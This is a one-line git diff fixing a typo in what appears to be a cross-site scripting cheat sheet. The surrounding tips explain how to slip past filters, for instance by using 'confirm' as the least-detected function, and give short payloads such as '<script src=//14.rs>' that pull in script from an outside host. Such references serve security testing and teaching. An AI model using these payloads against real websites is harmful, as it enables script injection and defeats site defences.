@@ -192,7 +192,7 @@ Come back later
 - alert and other pop-up functions don't need a value, so stop doing **alert('XSS')** and start doing **alert()**
 - You can use **//** to close a tag instead of **>**.
 - I have found that **confirm** is the least detected pop-up function so stop using **alert**.
-- Quotes around attribute value aren't neccessary as long as it doesn't contain spaces. You can use **&lt;script src=//14.rs&gt;** instead of **&lt;script src="//14.rs"&glt;**
+- Quotes around attribute value aren't neccessary as long as it doesn't contain spaces. You can use **&lt;script src=//14.rs&gt;** instead of **&lt;script src="//14.rs"&gt;**
 - The shortest independent "XSS" payload is **&lt;embed src=//14.rs&gt;** (19 chars)
 
 ### Awesome Credits
